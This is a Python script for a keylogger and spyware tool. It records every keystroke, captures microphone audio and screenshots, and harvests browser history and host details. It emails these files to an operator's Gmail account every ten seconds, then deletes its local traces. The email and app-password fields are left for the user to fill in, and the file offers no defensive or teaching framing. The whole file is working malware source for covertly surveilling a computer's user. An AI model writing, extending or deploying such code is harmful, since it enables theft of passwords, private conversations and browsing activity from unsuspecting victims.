# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
import smtplib

import socket
import platform

import pyaudio
import wave

from pynput.keyboard import Key, Listener

import time
from datetime import date, datetime
import os
import glob
import os.path

import sys
import json
import browserhistory as bh
import multiprocessing
import threading

import pyscreenshot


keys_information = "log-" + str(date.today()) + ".txt"
email_address = # (Your email address)
password = # Click manage google account > security > Apps passwords
toaddr = # (Your email address)
dt_string = datetime.now().strftime("%d_%m_%Y time-%H_%M_%S")
audio_information = "audio-" + dt_string + ".wav"
audio = pyaudio.PyAudio()
browser_hist = "history.txt"

screenshotcount = 0

file_path = "C:\\Users\\User\\OneDrive\\Desktop"
extend = "\\"


# send .txt file to email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body Of Email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', ' octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


# send screenshot to email
def send_ss_to_email():
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_Of_Email"

    msg.attach(MIMEText(body, 'plain'))

    for file in glob.glob(file_path + extend + "*.png"):
        with open(file, 'rb') as f:
            image = MIMEImage(f.read(), 'png')
        image.add_header('Content-Disposition', "attachment; filename= %s" % "screenshots")
        msg.attach(image)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


# Record Audio
def microphone():
    stream = audio.open(format=pyaudio.paInt16, channels=2, rate=44100, input=True, frames_per_buffer=1024)

    frames = []

    try:
        while True:
            data = stream.read(1024)
            frames.append(data)

            sound_file = wave.open(audio_information, "wb")
            sound_file.setnchannels(2)
            sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
            sound_file.setframerate(44100)
            sound_file.writeframes(b''.join(frames))
            sound_file.close()
    except SystemExit:
        stream.stop_stream()
        stream.close()
        audio.terminate()


# Take screenshot
def screenshot():
    global screenshotcount

    screenshotcount += 1
    im = pyscreenshot.grab()
    im.save(file_path + extend + "screenshot" + str(screenshotcount) + ".png")


# Obtain browser history
def browserhistory():
    browser_history = []
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((db_path, hist))
    with open(file_path + extend + browser_hist, 'w') as browser_txt:
        browser_txt.write(json.dumps(browser_history, indent=2))


# keystroke logging
count = 0
keys = []


def on_press(key):
    global keys, count

    # output each key typed
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        if Key.print_screen is key:
            screenshot()
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('enter') > 0:
                f.write("\n")
            if k.find('space') > 0:
                f.write(' ')
            if k.find('backspace') > 0:
                f.write('Backspace ')
            if k.find('esc') > 0 & k.find('esc') < 2:
                f.write("\n")
            # checking the value of each key
            if k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        t2.terminate()
        send_ss_to_email()
        # computer information
        with open(file_path + extend + keys_information, "a") as f:
            hostname = socket.gethostname()
            f.write("\nProcessor: " + (platform.processor()) + "\n")
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
        send_email(keys_information, file_path + extend + keys_information, toaddr)
        t1.terminate()
        browserhistory()
        send_email(browser_hist, file_path + extend + browser_hist, toaddr)
        os.remove(file_path + extend + "history.txt")
        t3.terminate()
        if not glob.glob(file_path + extend + "*.png"):
            print("no ss")
        for i in glob.glob(file_path + extend + "*.png"):
            os.remove(i)
        os.remove(keys_information)
        sys.exit(1)


# Threading for key-logging
def report():
    timer = threading.Timer(10, report)
    timer.start()
    send_email(keys_information, file_path + extend + keys_information, toaddr)


with Listener(on_press=on_press, on_release=on_release) as listener:
    if __name__ == '__main__':
        t1 = multiprocessing.Process(target=report)
        t2 = multiprocessing.Process(target=microphone)
        t3 = multiprocessing.Process(target=send_ss_to_email)
        t1.daemon = True
        t2.daemon = True
        t3.daemon = True
        t1.start()
        t2.start()
        t3.start()
        t1.join()
        t2.join()
        t3.join()
        listener.join()
        time.sleep(2)
        sys.exit(0)

